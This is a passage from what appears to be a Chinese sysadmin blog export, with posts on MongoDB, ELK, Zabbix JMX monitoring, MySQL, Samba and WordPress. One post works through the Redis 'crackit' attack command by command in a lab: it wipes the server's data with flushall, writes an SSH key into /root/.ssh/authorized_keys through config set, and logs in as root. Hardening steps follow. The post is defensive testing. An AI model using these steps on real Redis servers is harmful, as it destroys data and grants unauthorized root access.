支持 水平扩展的自动分片功能 支持 支持 内置副本以及高可用性 支持 支持 完整的、可扩展的索引支撑 支持 支持 丰富的文档查询功能 支持 支持 快速的文档内更新 支持 支持 聚合框架和MapReduce 支持 支持 使用GridFS存储大量多媒体数据 支持 支持 文本搜索 支持 支持 云、预置和混合部署 支持 支持 基于角色的权限控制 支持 支持 基于Kerberos先进的安全认证 不支持 支持 预置监控 不支持 支持 支持SNMP 不支持 支持 操作系统认证 不支持 支持这里使用的是企业版，版本是2.6，新版3.2还在开发中。。。 1.添加仓库[root@VM-248 ~]# vim /etc/yum.repos.d/mongodb-enterprise.repo [mongodb-enterprise-2.6] name=MongoDB Enterprise 2.6 Repository baseurl=https://repo.mongodb.com/yum/redhat/$releasever/mongodb-enterprise/2.6/$basearch/ gpgcheck=0 enabled=1 2.yum安装[root@VM-248 ~]# yum install -y mongodb-enterprise [root@VM-248 ~]# rpm -qa |grep mongodb mongodb-enterprise-server-2.6.11-1.el6.x86_64 mongodb-enterprise-tools-2.6.11-1.el6.x86_64 mongodb-enterprise-2.6.11-1.el6.x86_64 mongodb-enterprise-shell-2.6.11-1.el6.x86_64 mongodb-enterprise-mongos-2.6.11-1.el6.x86_64 3.修改配置[root@VM-248 ~]# egrep -v '^$|^#' /etc/mongod.conf logpath=/var/log/mongodb/mongod.log logappend=true fork=true dbpath=/var/lib/mongo pidfilepath=/var/run/mongodb/mongod.pid bind_ip=0.0.0.0 auth=true 4.启动服务[root@VM-248 ~]# /etc/init.d/mongod start [root@VM-248 ~]# chkconfig mongod on 5.添加密码[root@VM-248 ~]# mongo MongoDB shell version: 2.6.11 connecting to: test &gt; use admin switched to db admin &gt; db.addUser('root','password') WARNING: The 'addUser' shell helper is DEPRECATED. Please use 'createUser' instead Successfully added user: { \"user\" : \"root\", \"roles\" : [ \"root\" ] } &gt; db.system.users.find() { \"_id\" : \"admin.root\", \"user\" : \"root\", \"db\" : \"admin\", \"credentials\" : { \"MONGODB-CR\" : \"29e87d0a8716c4ae20efbcdd9d252f5b\" }, \"roles\" : [ { \"role\" : \"root\", \"db\" : \"admin\" } ] } &gt; exit bye 6.删除密码&gt; db.system.users.find() { \"_id\" : \"test.root\", \"user\" : \"root\", \"db\" : \"test\", \"credentials\" : { \"MONGODB-CR\" : \"29e87d0a8716c4ae20efbcdd9d252f5b\" }, \"roles\" : [ { \"role\" : \"dbOwner\", \"db\" : \"test\" } ] } &gt; db.system.users.remove({user:\"root\"}) WriteResult({ \"nRemoved\" : 1 }) &gt; db.system.users.find() &gt; exit bye 7.远程连接cenhuqing@cenhuqingdeMacBook-Pro ~$mongo vm248/admin -u root -p passwordMongoDB shell version: 3.0.4connecting to: vm248/admin&gt; show dbs;admin 0.078GBlocal 0.078GB&gt; exitbye参考文章：https://docs.mongodb.org/manual/tutorial/install-mongodb-enterprise-on-red-hat/","tags":[{"name":"mongodb","slug":"mongodb","permalink":"http://yoursite.com/tags/mongodb/"}]},{"title":"zabbix监控logstash的java","date":"2015-11-16T18:00:11.000Z","path":"2015/11/16/zabbix-monitor-logstash-java/","text":"Logstash 是一个运行在 JVM 上的软件，也就意味着 JMX 这种对 JVM 的通用监控方式对 Logstash 也是一样有效果的。要给 Logstash 启用 JMX，需要修改 ./bin/logstash.lib.sh 中 $JAVA_OPTS 变量的定义，或者在运行时设置 LS_JAVA_OPTS 环境变量。 在 ./bin/logstash.lib.sh 第 34 行 JAVA_OPTS=”$JAVA_OPTS -Djava.awt.headless=true” 下，添加如下几行： [root@monitor logstash]# vim bin/logstash.lib.sh JAVA_OPTS=\"$JAVA_OPTS -Dcom.sun.management.jmxremote\" JAVA_OPTS=\"$JAVA_OPTS -Dcom.sun.management.jmxremote.port=9010\" JAVA_OPTS=\"$JAVA_OPTS -Dcom.sun.management.jmxremote.local.only=false\" JAVA_OPTS=\"$JAVA_OPTS -Dcom.sun.management.jmxremote.authenticate=false\" JAVA_OPTS=\"$JAVA_OPTS -Dcom.sun.management.jmxremote.ssl=false\" 重启 logstash 服务，JMX 配置即可生效。 有 JMX 以后，我们可以通过 jconsole 界面查看，也可以通过 zabbix 等监控系统做长期监控。甚至 logstash 自己也有插件 logstash-input-jmx 来读取远程 JMX 数据。 注意，zabbix-server 本身并不直接对 JMX 发起请求，而是单独有一个 Java Gateway 作为中间代理层角色。zabbix-server 的 java poller 连接 zabbix-java-gateway，由 zabbix-java-gateway 去获取远程 JMX 信息。所以，在 zabbix-web 配置之前，需要先配置 zabbix server 相关进程和设置： ### 1\\. 安装zabbix-java-gateway [root@monitor logstash]# yum install http://repo.zabbix.com/zabbix/2.4/rhel/6/x86_64/zabbix-java-gateway-2.4.7-1.el6.x86_64.rpm 2. 修改zabbix_server配置文件[root@monitor logstash]# vim /usr/local/etc/zabbix_server.conf JavaGateway=127.0.0.1 JavaGatewayPort=10052 StartJavaPollers=5 3. 启动zabbix-jtva-gateway服务，重启logstash服务[root@monitor logstash]# /etc/init.d/zabbix-java-gateway start [root@monitor logstash]# /etc/init.d/logstash restart 查看JMX监控端口 [root@monitor logstash]# netstat -lutnp |grep 9010 tcp 0 0 0.0.0.0:9010 0.0.0.0:* LISTEN 11842/java 4. 配置zabbix4.1 选择监控JMX的主机 4.2 添加JMX 4.3 添加项目 4.4 创建图形 错误如下： 貌似无法连接java的9010端口，所以手动检测下检测需要cmdline-jmxclient-0.10.3.jar所以要先下载[root@monitor src]# wget http://crawler.archive.org/cmdline-jmxclient/cmdline-jmxclient-0.10.3.jar[root@monitor src]# java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:9010 java.lang:type=Memory NonHeapMemoryUsageException in thread “main” java.io.IOException: Failed to retrieve RMIServer stub: javax.naming.ServiceUnavailableException [Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.0.1; nested exception is: java.net.ConnectException: 拒绝连接] at javax.management.remote.rmi.RMIConnector.connect(RMIConnector.java:369) at javax.management.remote.JMXConnectorFactory.connect(JMXConnectorFactory.java:270) at org.archive.jmx.Client.execute(Client.java:225)果然无法连接，最后查看端口没有监听。所以重启logstash服务，并实时查看错误日志。[root@monitor ~]# tailf /var/log/logstash/logstash.errErrno::EACCES: Permission denied - /app/logstash-log/local6-5160-2015.11.16.log initialize at org/jruby/RubyFile.java:363 new at org/jruby/RubyIO.java:853 open at /opt/logstash/vendor/bundle/后来检查出来是自定义的配置文件有问题，移动配置文件，然后重启就可以了。[root@monitor src]# java -jar cmdline-jmxclient-0.10.3.jar - 127.0.0.1:9010 java.lang:type=Memory NonHeapMemoryUsage11/16/2015 17:02:27 +0800 org.archive.jmx.Client NonHeapMemoryUsage:committed: 62205952init: 2555904max: -1used: 58527992","tags":[{"name":"logstash","slug":"logstash","permalink":"http://yoursite.com/tags/logstash/"},{"name":"JMX","slug":"JMX","permalink":"http://yoursite.com/tags/JMX/"},{"name":"zabbix-java-gateway","slug":"zabbix-java-gateway","permalink":"http://yoursite.com/tags/zabbix-java-gateway/"}]},{"title":"mysql数据目录迁移","date":"2015-11-16T11:20:41.000Z","path":"2015/11/16/mysql-data-dir-move/","text":"早上来看到磁盘容量不足而报警，看下目录数据，决定迁移mysql数据到另外空闲磁盘上。 mysql的数据目录位置是/data/，需要迁移到/app/目录下 实现步骤： 1. 停止mysql服务[root@monitor ~]# /etc/init.d/mysqld stop Shutting down MySQL.... SUCCESS! 2. 移动数据[root@monitor ~]# mv /data/mysql/ /app/data/ 3. 修改主配置文件[root@monitor ~]# vim /etc/my.cnf [mysqld] basedir = /usr/local/mysql datadir = /app/data/mysql pid-file = /app/data/mysql/mysql.pid 4. 启动服务[root@monitor ~]# /etc/init.d/mysqld startStarting MySQL. ERROR! The server quit without updating PID file (/app/data/mysql/mysql.pid).启动报错，解决办法，开启错误日志 [root@monitor ~]# vim /etc/my.cnflog_error = /app/data/mysql/mysql-error.logslow_query_log_file = /app/data/mysql/mysql-slow.log由于日志路径未修改，导致出错。所以改完启动就可以了。 [root@monitor ~]# /etc/init.d/mysqld startStarting MySQL… SUCCESS!&nbsp;","tags":[{"name":"mysql","slug":"mysql","permalink":"http://yoursite.com/tags/mysql/"}]},{"title":"Redis-Crackit漏洞测试","date":"2015-11-12T13:57:58.000Z","path":"2015/11/12/redis-crackit-leak-testing/","text":"目前redis crackit漏洞爆出可以通过系统shell登录。免密码的，所以这个是很严重的。 下面我自己测试了下，并有几条防范措施。 环境：客户端：10.19.21.241服务端：10.19.21.242（此服务器运行redis服务的用户是root，如果不是root不能测试。） 1. 首先客户端生成ssh key[root@VM-241 ~]# ssh-keygen -t rsa -C “crackit@redis.io”Generating public/private rsa key pair.Enter file in which to save the key (/root/.ssh/id_rsa):Enter passphrase (empty for no passphrase):Enter same passphrase again:Your identification has been saved in /root/.ssh/id_rsa.Your public key has been saved in /root/.ssh/id_rsa.pub.The key fingerprint is:bb:16:6e:39:57:d4:b7:c0:dc:ed:05:80:a5:4e:7d:ae crackit@redis.ioThe key’s randomart image is:+–[ RSA 2048]—-+| oo. || .o . || o +.o..|| o ...+|| S .. ooo|| .. .. ..|| ..o .E || .. || o.o |+—————–+### 2. 给公钥添加换行[root@VM-241 ~]# (echo -e “\\n\\n”; cat /root/.ssh/id_rsa.pub; echo -e “\\n\\n”) &gt; redis.txt### 3. 清空服务器redis数据（慎重操作）[root@VM-241 ~]# redis-cli -h 10.19.21.242 flushallOK### 4. 将公钥写入到redis的key中[root@VM-241 ~]# cat redis.txt |redis-cli -h 10.19.21.242 -x set redisOK### 5. 连接redis服务器[root@VM-241 ~]# redis-cli -h 10.19.21.242redis 10.19.21.242:6379&gt; config set dir /root/.ssh #设置rdb存放路径OKredis 10.19.21.242:6379&gt; config set dbfilename “authorized_keys” #设置rdb文件的文件名OKredis 10.19.21.242:6379&gt; saveOKredis 10.19.21.242:6379&gt; exit### 6. 尝试登录[root@VM-241 ~]# ssh root@10.19.21.242The authenticity of host ‘10.19.21.242 (10.19.21.242)’ can’t be established.RSA key fingerprint is 12:79:d4:36:00:1d:de:48:13:bc:eb:e7:ca:83:84:c3.Are you sure you want to continue connecting (yes/no)? yesWarning: Permanently added ‘10.19.21.242’ (RSA) to the list of known hosts.Last login: Wed Apr 15 19:16:22 2015 from 10.19.10.25[root@VM-242 ~]#查看公钥内容[root@VM-242 ~]# cat /root/.ssh/authorized_keysREDIS0002?redisA?ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAwUkf3THelm1tARScEkGDZkHiixtBUiS7nW6ShdIcK0apiL+/7CYh/SrCX1k9X0+wFhhNbdQBdz+AIPpQA2UlhAogsj6YRR1vXYORumw2tRmAkxBifvsV/ZZs54u50O6NmMesZRfkzMqskoZCwNVKbzPWuXKmcrIyBnQzRp9NL7YjQXQnAqkD7btGjpdZZudqr/IUnkcS1i8dAbRnF0jQybrT8NnbiqOWVnuIhlXVgnASdI+Qq/p0w83HuuivXZLMMuIwfU9Tj30hV+haqatib1L0G+QyUBpgVmxuUZJrGlMsM+Nj15K8TIPeK4cQ419SbbJXrkqWX2fPok7+9iiD6w== crackit@redis.io?[root@VM-242 ~]# exit这样表示这台服务器被外部控制### 7. 如何防护##### 7.1 在服务器端禁用flushall命令。[root@VM-242 ~]# echo ‘rename-command flushall “”‘ &gt;&gt; /etc/redis.conf[root@VM-242 ~]# /etc/init.d/redis restart##### 客户端测试[root@VM-241 ~]# redis-cli -h 10.19.21.242 flushall(error) ERR unknown command ‘flushall’##### 7.2 服务器端设置redis的监听地址为127.0.0.1[root@VM-242 ~]# vim /etc/redis.confbind 127.0.0.1##### 7.3 建议不要用root用户运行。我是yum安装，默认启动用户是redis，为了测试，在服务里更改成root。大家测试也可以这么修改。[root@VM-242 ~]# vim /etc/init.d/redisstart() { [ -f $REDIS_CONFIG ] || exit 6 [ -x $exec ] || exit 5 echo -n $”Starting $name: “ #daemon –user ${REDIS_USER-redis} “$exec $REDIS_CONFIG” daemon –user root “$exec $REDIS_CONFIG” retval=$? echo [ $retval -eq 0 ] &amp;&amp; touch $lockfile return $retval}##### 7.4 设置redis服务器密码[root@VM-242 ~]# echo “requirepass xxoo” &gt;&gt; /etc/redis.conf&nbsp;","tags":[{"name":"redis-crackit","slug":"redis-crackit","permalink":"http://yoursite.com/tags/redis-crackit/"},{"name":"redis漏洞","slug":"redis漏洞","permalink":"http://yoursite.com/tags/redis漏洞/"}]},{"title":"ELK中展示用户位置","date":"2015-10-29T17:50:43.000Z","path":"2015/10/29/elk-shown-in-the-users-location/","text":"GeoIP 是最常见的免费 IP 地址归类查询库，同时也有收费版可以采购。GeoIP 库可以根据 IP 地址提供对应的地域信息，包括国别，省市，经纬度等，对于可视化地图和区域统计非常有用。 首先下载地图库 [root@monitor src]# curl -O http://geolite.maxmind.com/download/geoip/database/GeoLiteCity.dat.gz解压并移动到指定目录 [root@monitor src]# gunzip GeoLiteCity.dat.gz[root@monitor src]# mv GeoLiteCity.dat /opt/logstash/vendor/geoip/编辑配置文件，filter里更改为如下内容： if [type] == “nginx” { grok { match =&gt; { “message” =&gt; “%{NGINXACCESS}” } } geoip { source =&gt; “remote_addr” target =&gt; “geoip” database =&gt; “/opt/logstash/vendor/geoip/GeoLiteCity.dat” add_field =&gt; [ “[geoip][coordinates]”, “%{[geoip][longitude]}” ] add_field =&gt; [ “[geoip][coordinates]”, “%{[geoip][latitude]}” ] remove_field =&gt; [ “[geoip][latitude]”, “[geoip][longitude]” ] } mutate { convert =&gt; [ “[geoip][coordinates]”, “float”] } }重启logstash服务 [root@monitor geoip]# /etc/init.d/logstash restartKilling logstash (pid 29959) with SIGTERMWaiting logstash (pid 29959) to die…Waiting logstash (pid 29959) to die…logstash stopped.logstash started.打开浏览器，查看日志新加入的field 创建可视化","tags":[{"name":"geoip","slug":"geoip","permalink":"http://yoursite.com/tags/geoip/"},{"name":"kibana","slug":"kibana","permalink":"http://yoursite.com/tags/kibana/"}]},{"title":"搭建ELK(Logstash+Elasticsearch+Kibana)日志分析系统","date":"2015-10-29T17:20:44.000Z","path":"2015/10/29/logstash-elasticsearch-kibana-analysis-system-build/","text":"Logstash：负责日志的收集，处理和储存Elasticsearch：负责日志检索和分析Kibana：负责日志的可视化 1. 系统环境：[root@monitor ~]# cat /etc/redhat-release CentOS release 6.6 (Final) 检测主机名 [root@monitor ~]# hostname -f monitor 安装java [root@monitor ~]# yum install java-1.8.0-openjdk 查看java版本 [root@monitor ~]# java -version openjdk version \"1.8.0_65\" OpenJDK Runtime Environment (build 1.8.0_65-b17) OpenJDK 64-Bit Server VM (build 25.65-b01, mixed mode) 2. 安装logstashyum安装 [root@monitor ~]# yum install https://download.elastic.co/logstash/logstash/packages/centos/logstash-1.5.4-1.noarch.rpm 创建证书 [root@monitor ~]# cd /etc/pki/tls [root@monitor tls]# openssl req -subj '/CN=monitor/' -x509 -days 3650 -batch -nodes -newkey rsa:2048 -keyout private/logstash-forwarder.key -out certs/logstash-forwarder.crt Generating a 2048 bit RSA private key ...................................................+++ ...........................................................................................................+++ writing new private key to 'private/logstash-forwarder.key' ----- 同步证书到客户端 [root@monitor tls]# scp /etc/pki/tls/certs/logstash-forwarder.crt root@baicare:/etc/pki/tls/certs/ 创建patterns目录，并编写nginx-grok [root@monitor tls]# mkdir /opt/logstash/patterns [root@monitor tls]# vim /opt/logstash/patterns/nginx NGUSERNAME [a-zA-Z\\.\\@\\-\\+_%]+ NGUSER %{NGUSERNAME} NGINXACCESS %{IPORHOST:slb_addr} - - \\[%{HTTPDATE:time_local}\\] \"%{WORD:method} %{URIPATH:path}(?:%{URIPARAM:param})? HTTP/%{NUMBER:httpversion}\" %{INT:status} %{INT:body_bytes_sent} %{QS:http_referer} %{QS:http_user_agent} \"%{IPORHOST:remote_addr}\" 编辑配置文件 root@monitor tls]# vim /etc/logstash/conf.d/logstash.conf input { lumberjack { port =&gt; 5000 type =&gt; \"logs\" ssl_certificate =&gt; \"/etc/pki/tls/certs/logstash-forwarder.crt\" ssl_key =&gt; \"/etc/pki/tls/private/logstash-forwarder.key\" } } filter { if [type] == \"syslog\" { grok { match =&gt; { \"message\" =&gt; \"%{SYSLOGTIMESTAMP:syslog_timestamp} %{SYSLOGHOST:syslog_hostname} %{DATA:syslog_program}(?:\\[%{POSINT:syslog_pid}\\])?: %{GREEDYDATA:syslog_message}\" } add_field =&gt; [ \"received_at\", \"%{@timestamp}\" ] add_field =&gt; [ \"received_from\", \"%{host}\" ] } syslog_pri { } date { match =&gt; [ \"syslog_timestamp\", \"MMM d HH:mm:ss\", \"MMM dd HH:mm:ss\" ] } } if [type] == \"nginx\" { grok { match =&gt; { \"message\" =&gt; \"%{NGINXACCESS}\" } } } } output { elasticsearch { host =&gt; localhost } stdout { codec =&gt; rubydebug } 启动服务 [root@monitor ~]# /etc/init.d/logstash start [root@monitor ~]# chkconfig logstash on 3. 安装elasticsearchyum安装 [root@monitor ~]# yum install https://download.elastic.co/elasticsearch/elasticsearch/elasticsearch-1.7.1.noarch.rpm 添加到开机启动，并启动服务 [root@monitor ~]# chkconfig --add elasticsearch [root@monitor ~]# service elasticsearch start Starting elasticsearch: [ OK ] [root@monitor ~]# netstat -lutnp |grep java tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 26898/java tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 26898/java udp 0 0 0.0.0.0:54328 0.0.0.0:* 26898/java 测试是否能正常访问 [root@monitor ~]# curl -X GET http://localhost:9200 { \"status\" : 200, \"name\" : \"Conquistador\", \"cluster_name\" : \"elasticsearch\", \"version\" : { \"number\" : \"1.7.1\", \"build_hash\" : \"b88f43fc40b0bcd7f173a1f9ee2e97816de80b19\", \"build_timestamp\" : \"2015-07-29T09:54:16Z\", \"build_snapshot\" : false, \"lucene_version\" : \"4.10.4\" }, \"tagline\" : \"You Know, for Search\" } 4.安装kibana下载源码包 [root@monitor ~]# wget https://download.elastic.co/kibana/kibana/kibana-4.1.1-linux-x64.tar.gz 解压并重命名 [root@monitor ~]# tar xf kibana-4.1.1-linux-x64.tar.gz -C /usr/local/ [root@monitor ~]# mv /usr/local/kibana-4.1.1-linux-x64 /usr/local/kibana 编写启动脚本 [root@monitor ~]# vim /etc/rc.d/init.d/kibana #!/bin/bash # BEGIN INIT INFO # Provides: kibana # Default-Start: 2 3 4 5 # Default-Stop: 0 1 6 # Short-Description: Runs kibana daemon # Description: Runs the kibana daemon as a non-root user ### END INIT INFO # Process name NAME=kibana DESC=\"Kibana4\" PROG=\"/etc/init.d/kibana\" # Configure location of Kibana bin KIBANA_BIN=/usr/local/kibana/bin # PID Info PID_FOLDER=/var/run/kibana/ PID_FILE=/var/run/kibana/$NAME.pid LOCK_FILE=/var/lock/subsys/$NAME PATH=/bin:/usr/bin:/sbin:/usr/sbin:$KIBANA_BIN DAEMON=$KIBANA_BIN/$NAME # Configure User to run daemon process DAEMON_USER=root # Configure logging location KIBANA_LOG=/var/log/kibana.log # Begin Script RETVAL=0 if [ `id -u` -ne 0 ]; then echo \"You need root privileges to run this script\" exit 1 fi # Function library . /etc/init.d/functions start() { echo -n \"Starting $DESC : \" pid=`pidofproc -p $PID_FILE kibana` if [ -n \"$pid\" ] ; then echo \"Already running.\" exit 0 else # Start Daemon if [ ! -d \"$PID_FOLDER\" ] ; then mkdir $PID_FOLDER fi daemon --user=$DAEMON_USER --pidfile=$PID_FILE $DAEMON 1&gt;\"$KIBANA_LOG\" 2&gt;&amp;1 &amp; sleep 2 pidofproc node &gt; $PID_FILE RETVAL=$? [[ $? -eq 0 ]] &amp;&amp; success || failure echo [ $RETVAL = 0 ] &amp;&amp; touch $LOCK_FILE return $RETVAL fi } reload() { echo \"Reload command is not implemented for this service.\" return $RETVAL } stop() { echo -n \"Stopping $DESC : \" killproc -p $PID_FILE $DAEMON RETVAL=$? echo [ $RETVAL = 0 ] &amp;&amp; rm -f $PID_FILE $LOCK_FILE } case \"$1\" in start) start ;; stop) stop ;; status) status -p $PID_FILE $DAEMON RETVAL=$? ;; restart) stop start ;; reload) reload ;; *) # Invalid Arguments, print the following message. echo \"Usage: $0 {start|stop|status|restart}\" &gt;&amp;2 exit 2 ;; esac 启动服务 [root@monitor local]# chmod +x /etc/rc.d/init.d/kibana [root@monitor local]# /etc/init.d/kibana start Starting Kibana4 : [确定] [root@monitor local]# chkconfig kibana on [root@monitor local]# netstat -lutnp |grep java tcp 0 0 0.0.0.0:9300 0.0.0.0:* LISTEN 26898/java tcp 0 0 0.0.0.0:9200 0.0.0.0:* LISTEN 26898/java udp 0 0 0.0.0.0:54328 0.0.0.0:* 26898/java 5. 配置nginx编辑配置文件 [root@monitor vhost]# vim kibana.conf server { listen 80; server_name kibana.baicare.com; location / { proxy_pass http://127.0.0.1:5601; root /usr/local/kibana/src; auth_basic \"Restricted\"; auth_basic_user_file /usr/local/nginx/conf/kibana.htpasswd; } } 创建登录账号密码 [root@monitor geoip]# htpasswd -c /usr/local/nginx/conf/kibana.htpasswd charlie New password: Re-type new password: Adding password for user charlie 启动服务 [root@monitor vhost]# nginx -t nginx: the configuration file /usr/local/nginx/conf/nginx.conf syntax is ok nginx: configuration file /usr/local/nginx/conf/nginx.conf test is successful [root@monitor vhost]# nginx -s reload 以上是服务器端配置，下面是客户端配置&nbsp; 6. 安装logstash-forwarderyum安装logstash-forwarder [root@baicare ~]# yum install -y https://download.elastic.co/logstash-forwarder/binaries/logstash-forwarder-0.4.0-1.x86_64.rpm[root@baicare ~]# cp /etc/logstash-forwarder.conf /etc/logstash-forwarder.conf.bak编辑配置 { “network”: { “servers”: [ “monitor:5000” ], &quot;ssl ca&quot;: &quot;/etc/pki/tls/certs/logstash-forwarder.crt&quot;, &quot;timeout&quot;: 15 }, “files”: [ { “paths”: [ “/var/log/messages”, “/var/log/secure” ], “fields”: { “type”: “syslog” } }, { “paths”: [ “/home/wwwlogs/access_nginx.log” ], “fields”: { “type”: “nginx” } } ]}启动服务 [root@baicare src]# /etc/init.d/logstash-forwarder startlogstash-forwarder started然后打开浏览器，访问服务器（域名解析提前做好） 7. 配置索引模式 &nbsp; 参考文章： ELKstack 中文指南 - http://kibana.logstash.es/三斗室 - http://chenlinux.com/elastic - https://www.elastic.co/guideLTMP索引 - http://wsgzao.github.io/index/#LTMP &nbsp;","tags":[{"name":"kibana","slug":"kibana","permalink":"http://yoursite.com/tags/kibana/"},{"name":"elasticsearch","slug":"elasticsearch","permalink":"http://yoursite.com/tags/elasticsearch/"},{"name":"logstash","slug":"logstash","permalink":"http://yoursite.com/tags/logstash/"}]},{"title":"samba服务搭建","date":"2015-10-23T16:47:50.000Z","path":"2015/10/23/samba-service-build/","text":"好久没弄这个，今天朋友问我samba服务问题。又重新弄了一遍，加深下记忆。系统：centos6.7 1. 安装[root@VM-241 ~]# yum install -y samba samba-client 2. 修改配置文件[root@VM-241 ~]# vim /etc/samba/smb.conf [global] workgroup = MYGROUP server string = Samba Server Version %v #允许哪些网段访问共享服务 hosts allow = 127\\. 10.19.21\\. 10.19.10. # logs split per machine log file = /var/log/samba/log.%m # max 50KB per log file, then rotate max log size = 50 security = user passdb backend = tdbsam load printers = yes cups options = raw [homes] comment = Home Directories browseable = no writable = yes [printers] comment = All Printers path = /var/spool/samba browseable = no guest ok = no writable = no printable = yes [share] #共享名 comment = Public Stuff #共享说明 path = /home/share #共享路径 public = no #不允许匿名登录 writable = yes #可写 printable = no #关闭打印服务 write list = @user1 #可写用户组，多个可用空格分隔 valid users = @user1 #有效的用户组，多个可用空格分隔 browseable = yes #用户可浏览 3. 测试配置文件语法[root@VM-241 ~]# testparm Load smb config files from /etc/samba/smb.conf Processing section \"[homes]\" Processing section \"[printers]\" Processing section \"[share]\" Loaded services file OK. Server role: ROLE_STANDALONE Press enter to see a dump of your service definitions [global] workgroup = MYGROUP server string = Samba Server Version %v log file = /var/log/samba/log.%m max log size = 50 idmap config * : backend = tdb hosts allow = 127., 10.19.21., 10.19.10. cups options = raw [homes] comment = Home Directories read only = No browseable = No [printers] comment = All Printers path = /var/spool/samba printable = Yes print ok = Yes browseable = No [share] comment = Public Stuff path = /home/share write list = @user1 read only = No 4. 创建系统用户和smb密码[root@VM-241 ~]# useradd user1 [root@VM-241 ~]# smbpasswd -a user1 New SMB password: Retype new SMB password: 5. 创建共享目录[root@VM-241 ~]# mkdir /home/share [root@VM-241 ~]# chmod 777 /home/share 6. 现在本机测试[root@VM-241 ~]# smbclient //localhost/share -U user1 Enter user1's password: Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.23-20.el6] smb: \\&gt; put hello.py putting file hello.py as \\hello.py (22.4 kb/s) (average 22.4 kb/s) smb: \\&gt; ls . D 0 Fri Oct 23 14:02:34 2015 .. D 0 Fri Oct 23 13:59:57 2015 hello.py A 321 Fri Oct 23 14:02:34 2015 35036 blocks of size 524288\\. 20525 blocks available smb: \\&gt; exit 7. 客户端连接7.1 测试客户端是mac，所以打开Finder, 菜单里找到”前往”—&gt;”连接服务器”、或者运行command+k命令 7.2 输入用户名和密码 7.3 查看刚上传的共享文件 7.4 从客户端添加文件 7.5 到服务器上查看 8.添加匿名用户访问[root@VM-241 ~]# vim /etc/samba/smb.conf [global] ... security = user passdb backend = tdbsam map to guest = bad user #允许匿名访问 ... [public] comment = Public Stuff path = /home/public public = yes writable = yes printable = no guest ok = yes #允许匿名访问 9.创建共享目录和添加权限[root@VM-241 ~]# mkdir /home/public [root@VM-241 ~]# chmod 777 /home/public 10.重启服务[root@VM-241 ~]# /etc/init.d/smb restart 11.服务器本地测试[root@VM-241 ~]# smbclient //localhost/public Enter guest's password: Anonymous login successful Domain=[MYGROUP] OS=[Unix] Server=[Samba 3.6.23-20.el6] smb: \\&gt; ls . D 0 Fri Oct 23 15:16:05 2015 .. D 0 Fri Oct 23 15:16:05 2015 35036 blocks of size 524288\\. 20524 blocks available list.txt .ssh/ smb: \\&gt; put md5.txt putting file md5.txt as \\md5.txt (8.8 kb/s) (average 8.8 kb/s) smb: \\&gt; ls . D 0 Fri Oct 23 15:17:00 2015 .. D 0 Fri Oct 23 15:16:05 2015 md5.txt A 153 Fri Oct 23 15:17:00 2015 35036 blocks of size 524288\\. 20524 blocks available 12.客户端测试12.1 测试客户端是mac，所以打开Finder, 菜单里找到”前往”—&gt;”连接服务器”、或者运行command+k命令 12.2 匿名访问，选择”客人” 12.3 查看结果 &nbsp; 13. samba参数详解 [share] # 该共享的共享名 comment = smb share test # 该共享的备注 path = /home/share # 共享路径 allow hosts = host(subnet) # 设置该Samba服务器允许的工作组或者域 deny hosts = host(subnet) # 设置该Samba服务器拒绝的工作组或者域 available = yes|no # 设置该共享目录是否可用 browseable = yes|no # 设置该共享目录是否可显示 writable = yes|no # 指定了这个目录缺省是否可写，也可以用readonly = no来设置可写 public = yes|no # 指明该共享资源是否能给游客帐号访问，guest ok = yes其实和public = yes是一样的 user = user, @group # user设置所有可能使用该共享资源的用户，也可以用@group代表group这个组的所有成员，不同的项目之间用空格或者逗号隔开 valid users = user, @group # 指定能够使用该共享资源的用户和组 invalid users = user, @group # 指定不能够使用该共享资源的用户和组 read list = user, @group # 指定只能读取该共享资源的用户和组 write list = user, @group # 指定能读取和写该共享资源的用户和组 admin list = user, @group # 指定能管理该共享资源（包括读写和权限赋予等）的用户和组 hide dot files = yes|no # 指明是否像UNIX那样隐藏以“.”号开头的文件 create mode = 0755 # 指明新建立的文件的属性，一般是0755 directory mode = 0755 # 指明新建立的目录的属性，一般是0755 sync always = yes|no # 指明对该共享资源进行写操作后是否进行同步操作 short preserve case = yes|no # 指明是否区分文件名大小写 preserve case = yes|no # 指明是否保持大小写 case sensitive = yes|no # 指明是否对大小写敏感，一般选no，不然可能引起错误 mangle case = yes|no # 指明混合大小写 default case = upper|lower # 指明缺省的文件名是全部大写还是小写 force user = testuser # 强制把建立文件的属主是谁。如果我有一个目录，让guest可以写，那么guest就可以删除，如果我用force user= testuser强制建立文件的属主是testuser，同时限制create mask = 0755，这样guest就不能删除了 wide links = yes|no # 指明是否允许共享外符号连接，比如共享资源里面有个连接指向非共享资源里面的文件或者目录，如果设置wide links = no将使该连接不可用 max connections = 100 # 设定最大同时连接数 delete readonly = yes|no # 指明能否删除共享资源里面已经被定义为只读的文件&nbsp;","tags":[{"name":"samba","slug":"samba","permalink":"http://yoursite.com/tags/samba/"},{"name":"smbclient","slug":"smbclient","permalink":"http://yoursite.com/tags/smbclient/"}]},{"title":"Hero","date":"2015-10-23T13:47:42.000Z","path":"2015/10/23/hero/","text":"在网易云音乐里偶然听见这首歌，第一遍感觉还不错，多听几遍也许你会喜欢，旋律很美。 共享出来，给大家欣赏下 [embed]http://www.cenhq.com/wp-content/uploads/2015/10/Family-of-the-Year-Hero.mp3[/embed]","tags":[]},{"title":"wordpress添加ClustrMaps","date":"2015-10-16T14:44:01.000Z","path":"2015/10/16/wordpress-add-clustrmaps/","text":"首先到http://www.clustrmaps.com/zh/index.htm生成自己的地图 然后注册登录账号，获取地图代码根据主题布局放置代码位置，这里我放在右侧。编辑文件sidebar-right.php,添加以下内容：&lt;!–ClusterMap–&gt;&lt;aside class=”widget”&gt;&lt;h3 class=”widget-title”&gt;统计&lt;/h3&gt;&lt;div id=”clustrmaps-widget”&gt;&lt;/div&gt;&lt;script type=”text/javascript”&gt;var _clustrmaps = {‘url’ : ‘http://www.cenhq.com‘, ‘user’ : 1181037, ‘server’ : ‘3’, ‘id’ : ‘clustrmaps-widget’, ‘version’ : 1, ‘date’ : ‘2015-10-16’, ‘lang’ : ‘zh’, ‘corners’ : ‘square’ };(function (){ var s = document.createElement(‘script’); s.type = ‘text/javascript’; s.async = true; s.src = ‘http://www3.clustrmaps.com/counter/map.js‘; var x = document.getElementsByTagName(‘script’)[0]; x.parentNode.insertBefore(s, 